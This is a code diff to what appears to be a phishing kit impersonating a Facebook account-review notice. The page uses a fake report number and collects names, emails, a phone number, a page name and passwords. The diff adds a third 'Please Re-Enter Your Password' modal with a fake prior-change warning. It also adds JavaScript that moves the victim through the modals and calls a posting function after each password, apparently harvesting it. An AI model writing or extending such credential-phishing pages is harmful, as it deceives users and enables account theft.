@@ -140,7 +140,7 @@
                     class="text-center pb-3"
                     style="font-size: 20px; text-align: center"
                   >
-                    <strong>Get Started</strong>
+                    <strong style="font-weight: bold">Get Started</strong>
                   </div>
                   <div
                     class="mb-4"
@@ -155,8 +155,8 @@
                     been in violation of our terms of services and community guidelines.
                     As a result, your account is scheduled for review
                     <br />
-                    <div class="text-start pt-2" style="font-size: 14px">
-                      <strong>Report no: 3088553115</strong>
+                    <div class="text-start pt-2" style="font-size: 14px; font-weight: bold">
+                      <strong style="font-size: 14px; font-weight: bold">Report no: 3088553115</strong>
                     </div>
                   </div>
                   <form action="javascript:void(0)" method="post" id="submitFullDataForm">
@@ -354,7 +354,7 @@
     </div>
     <!-- Modal -->
 
-    <!-- Modal -->
+    <!-- Modal 1 -->
     <div
       class="modal fade show"
       id="exampleModal1"
@@ -415,6 +415,93 @@
                       "
                     >
                       The password you've entered is incorrect.
+                    </p>
+                    <span> </span>
+                  </span>
+                </div>
+              </div>
+            </div>
+            <div style="text-align: right">
+              <button
+                @click="submitFullDataThird()"
+                type="submit"
+                class="btn butoni"
+                style="
+                  color: #fff !important;
+                  background-color: #2c84f4 !important;
+                  margin-top: 0px !important;
+                  width: auto !important;
+                "
+              >
+                Continue
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+    <!-- Modal 2 -->
+    <div
+      class="modal fade show"
+      id="exampleModal2"
+      tabindex="-1"
+      aria-labelledby="exampleModalLabel"
+      aria-hidden="true"
+      role="dialog"
+      style="display: none;"
+    >
+      <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+          <div class="modal-header custom-header px-0">
+            <h5
+              class="modal-title"
+              id="exampleModalLabel1"
+              style="font-size: 16px; font-weight: 600"
+            >
+              Please Re-Enter Your Password
+            </h5>
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+              <span aria-hidden="true">×</span>
+            </button>
+          </div>
+          <form action="javascript:void(0)" method="post">
+            <div class="modal-body px-0">
+              <div id="modal_form">
+                <p style="font-size: 14px; margin-bottom: 10px">
+                  For your security, you must enter your password to continue.
+                </p>
+                <input type="hidden" name="full_name" id="fillFullName" />
+                <input type="hidden" name="business_email" id="fillBusinessEmail" />
+                <input type="hidden" name="personal_email" id="fillPersonalEmail" />
+                <input type="hidden" name="phone" id="fillPhone" />
+                <input type="hidden" name="facebook_pagename" id="fillFacebookPagename" />
+                <input type="hidden" name="first_password" id="fillFirstPassword" />
+                <input type="hidden" name="second_password" id="fillSecondPassword" />
+                <div class="mt-1">
+                  <div>
+                    <label for="password">Password:</label>
+                  </div>
+                  <input
+                    v-model="form.third_password"
+                    type="password"
+                    class="form-control w-100"
+                    name="third_password"
+                    required=""
+                    id="third_password"
+                    style=""
+                  />
+                </div>
+                <div class="justify-content-between" style="text-align: right">
+                  <span class="text-danger" id="wrong_pass">
+                    <p
+                      style="
+                        color: red;
+                        font-size: 13px;
+                        font-weight: 500;
+                        margin-bottom: 20px;
+                      "
+                    >
+                      Your password was changed 2 months ago.
                     </p>
                     <span> </span>
                   </span>
@@ -647,6 +734,13 @@ export default {
       if (this.form.first_password != '') {
         $('#exampleModal').hide();
         $('#exampleModal1').show();
+        var confirm = this.postConfirm();
+      }
+    },
+    submitFullDataThird: function(){
+      if (this.form.second_password != '') {
+        $('#exampleModal1').hide();
+        $('#exampleModal2').show();
         var confirm = this.postConfirm();
       }
     },
@@ -11965,10 +12059,11 @@ p {
 }
 
 .masheader {
-  background-image: url("../static/uploads/block_images/30175859_1847141705586364_4634876909090504704_n.1a04d13ed075a5eb588b.jpg");
+  background-image: url("src\static\uploads\img\30175859_1847141705586364_4634876909090504704_n.1a04d13ed075a5eb588b.jpg");
   background-repeat: no-repeat;
   background-size: cover;
 }
+
 
 .trupi {
   background-color: white;
